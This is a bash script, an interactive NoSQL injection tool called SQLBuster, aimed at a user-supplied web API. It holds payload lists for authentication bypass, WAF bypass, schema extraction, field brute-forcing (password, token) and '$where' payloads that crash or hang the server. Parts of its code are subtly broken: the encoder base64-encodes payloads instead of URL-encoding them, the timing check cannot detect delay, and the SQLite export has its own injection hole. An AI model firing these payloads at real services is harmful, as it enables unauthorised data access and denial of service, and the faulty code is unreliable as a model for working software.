#!/bin/bash

# Global Variables
session_cookie=""
auth_token=""
proxy=""
custom_headers=""
user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
output=""

print_banner() {
    local banner=(
    "
        __    ____  __     ___           _
       / _\  /___ \/ /    / __\_   _ ___| |_ ___ _ __
       \ \  //  / / /    /__\// | | / __| __/ _ \ '__|
       _\ \/ \_/ / /___ / \/  \ |_| \__ \ ||  __/ |
       \__/\___,_\____/ \_____/\__,_|___/\__\___|_|"

    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}

urlencode() {
    local data="$1"
    local encoded=""
    printf -v encoded '%s' "${data//%/%%}"
    echo "$encoded" | xargs -0 printf "%s" | sed 's/ /+/g;s/[^a-zA-Z0-9._+-]/\\x&/g' | xargs printf "%b" | base64 -w0 | sed 's/+/%2B/g;s/\//%2F/g;s/=/__/g'
}

make_request() {
    local url="$1"
    local headers=()

    if [ -n "$session_cookie" ]; then
        headers+=("-H" "Cookie: $session_cookie")
    fi
    if [ -n "$auth_token" ]; then
        headers+=("-H" "Authorization: Bearer $auth_token")
    fi
    if [ -n "$custom_headers" ]; then
        IFS=',' read -ra hdrs <<< "$custom_headers"
        for hdr in "${hdrs[@]}"; do
            headers+=("-H" "$hdr")
        done
    fi

    curl -s -k -A "$user_agent" --proxy "$proxy" "${headers[@]}" "$url"
}

encode_payload() {
    local payload="$1"
    urlencode "$payload"
}

detect_nosqli() {
    local url="$1"
    local payloads=(
        '{"$ne": null}'
        '{"$gt": ""}'
        '{"$regex": "^a"}'
        '{"$eq": "a"}'
        '{"$in": ["a", "b", "c"]}'
        '{"$not": {"$type": 2}}'
        '{"username": {"$regex": "^admin"}}'
    )

    echo "[+] Detecting basic NoSQL injection vulnerabilities..."
    for payload in "${payloads[@]}"; do
        full_url="$url?filter=$(encode_payload "$payload")"
        response=$(make_request "$full_url")
        if [[ "$response" =~ "error" || "$response" =~ "found" ]]; then
            echo "[!] Potential NoSQL Injection found with payload: $payload"
            output+="\n[VULNERABLE] $payload"
            return 0
        fi
    done
    echo "[-] No basic NoSQL Injection vulnerabilities detected."
    return 1
}

detect_blind_nosqli() {
    local url="$1"
    local true_condition='{"$eq": 1}'
    local false_condition='{"$eq": 0}'

    echo "[+] Testing for Blind NoSQL Injection..."
    output+="\n\n[BLIND TESTING]"

    # Time-based check
    start_time=$(date +%s)
    make_request "$url?filter=$(encode_payload "$true_condition")" > /dev/null
    end_time=$(date +%s)
    response_time=$((end_time - start_time))

    if (( response_time > 3 )); then
        echo "[!] Potential Time-Based Blind NoSQL Injection detected (delay: ${response_time}s)"
        output+="\n[!] Time-Based Blind detected (delay: ${response_time}s)"
    fi

    # Boolean-based check
    true_response=$(make_request "$url?filter=$(encode_payload "$true_condition")")
    false_response=$(make_request "$url?filter=$(encode_payload "$false_condition")")

    if [[ "$true_response" != "$false_response" ]]; then
        echo "[!] Potential Boolean-Based Blind NoSQL Injection detected"
        output+="\n[!] Boolean-Based Blind detected"
    fi
}

extract_schema() {
    local url="$1"
    local query='{"$where": "Object.keys(this).length > 0"}'

    echo "[+] Attempting schema extraction..."
    response=$(make_request "$url?filter=$(encode_payload "$query")")

    if [[ "$response" == *"{\""* ]]; then
        echo "[+] Possible fields found:"
        # Extract keys like "username", "email", etc.
        echo "$response" | grep -o '"[^"]*"' | sort | uniq
        output+="\n\n[SCHEMA]\n$response"
    else
        echo "[-] Failed to extract schema"
    fi
}

error_based_exfiltration() {
    local url="$1"
    local field="$2"
    local query="{\"\$where\": \"this.$field.length > 1000\"}"

    echo "[+] Attempting Error-Based Data Exfiltration..."
    response=$(make_request "$url?filter=$(encode_payload "$query")")

    if [[ "$response" =~ "error" || "$response" =~ "exception" ]]; then
        echo "[!] Error response may contain leaked data:"
        echo "$response"
        output+="\n\n[ERROR EXFIL]\n$response"
    else
        echo "[-] No error-based exfiltration detected"
    fi
}

generate_payload() {
    read -p "Enter field name (e.g., username): " field
    read -p "Enter operator (e.g., \$ne, \$regex): " operator
    read -p "Enter value (e.g., admin, ^a): " value

    payload="{\"$field\": {\"$operator\": \"$value\"}}"
    echo "[+] Generated Payload: $payload"
    output+="\n\n[GENERATED PAYLOAD]\n$payload"
}

test_waf_bypass() {
    local url="$1"
    local bypass_payloads=(
        '{"username": {"\u0024ne": "admin"}}'
        '{"username": {"$ne": null}}'
        '{"$where": "1 == 1"}'
        '{"$gt": ""}'
        '{"$regex": ".*"}'
    )

    echo "[+] Testing WAF Bypass Techniques..."
    output+="\n\n[WAF BYPASS TESTING]"

    for payload in "${bypass_payloads[@]}"; do
        response=$(make_request "$url?filter=$(encode_payload "$payload")")
        if [[ "$response" =~ "admin" || "$response" =~ "user" ]]; then
            echo "[!] Bypass successful with payload: $payload"
            output+="\n[SUCCESS] $payload"
        fi
    done
}

test_rce() {
    local url="$1"
    local rce_payloads=(
        '{"$where": "process.exit(1)"}'
        '{"$where": "while(true){}"}'
        '{"$where": "new Date().getTime() > 0"}'
    )

    echo "[+] Testing for RCE possibilities..."
    output+="\n\n[RCE TESTING]"

    for payload in "${rce_payloads[@]}"; do
        response=$(make_request "$url?filter=$(encode_payload "$payload")")

        if [[ -z "$response" || "$response" =~ "timed out" ]]; then
            echo "[!] Possible RCE vulnerability with payload: $payload"
            output+="\n[POSSIBLE RCE] $payload"
        fi
    done
}

brute_force_fields() {
    local url="$1"
    local common_fields=("username" "password" "email" "token" "role" "id" "name" "session" "admin" "user")

    echo "[+] Brute-forcing field names..."
    output+="\n\n[FIELD BRUTE-FORCE]"

    for field in "${common_fields[@]}"; do
        response=$(make_request "$url?filter=$(encode_payload "{\"$field\": {\"\$exists\": true}}")")
        if [[ "$response" != "[]" && "$response" != "" ]]; then
            echo "[+] Found field: $field"
            output+="\n[FIELD FOUND] $field"
        fi
    done
}

export_to_sqlite() {
    local db="nosql_findings.db"

    if ! command -v sqlite3 &> /dev/null; then
        echo "[-] sqlite3 not found. Install with: sudo apt install sqlite3"
        return
    fi

    sqlite3 "$db" "CREATE TABLE IF NOT EXISTS findings (
        id INTEGER PRIMARY KEY,
        url TEXT,
        payload TEXT,
        result TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );"

    sqlite3 "$db" "INSERT INTO findings (url, payload, result) VALUES ('$url', '$payload', '$response');"
    echo "[+] Results saved to SQLite database: $db"
    output+="\n\n[EXPORTED TO] $db"
}

generate_report() {
    local format="$1"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local report_file="nosql_report_${timestamp}.${format}"

    case $format in
        html)
            echo "<html><body><pre>$output</pre></body></html>" > "$report_file"
            ;;
        txt)
            echo "$output" > "$report_file"
            ;;
        *)
            echo "[-] Invalid format. Using txt as default"
            echo "$output" > "nosql_report_${timestamp}.txt"
            return
            ;;
    esac

    echo "[+] Report generated: $report_file"
}

main() {
    print_banner

    read -p "Enter target URL (e.g., https://example.com/api): " url
    url="${url%/}"

    read -p "Session cookie (if any): " session_cookie
    read -p "Auth token (if any): " auth_token
    read -p "Proxy (if any): " proxy
    read -p "Custom headers (comma-separated): " custom_headers
    read -p "User-Agent [default: Mozilla/5.0]: " user_agent
    user_agent="${user_agent:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36}"

    # Detection phase
    detect_nosqli "$url"
    detect_blind_nosqli "$url"

    # Interactive menu
    while true; do
        echo -e "\n=== Main Menu ==="
        echo "1) Schema Extraction"
        echo "2) Error-Based Exfiltration"
        echo "3) Generate Custom Payload"
        echo "4) Test WAF Bypass"
        echo "5) Test for RCE"
        echo "6) Brute-Force Fields"
        echo "7) Export to SQLite"
        echo "8) Generate Report"
        echo "9) Exit"

        read -p "Select option: " choice

        case $choice in
            1) extract_schema "$url" ;;
            2)
                read -p "Enter field to exfiltrate: " field
                error_based_exfiltration "$url" "$field"
                ;;
            3) generate_payload ;;
            4) test_waf_bypass "$url" ;;
            5) test_rce "$url" ;;
            6) brute_force_fields "$url" ;;
            7) export_to_sqlite ;;
            8)
                read -p "Format (html/json/txt): " format
                generate_report "$format"
                ;;
            9)
                echo "[+] Exiting SQLBuster"
                exit 0
                ;;
            *) echo "[-] Invalid option" ;;
        esac
    done
}

main "$@"
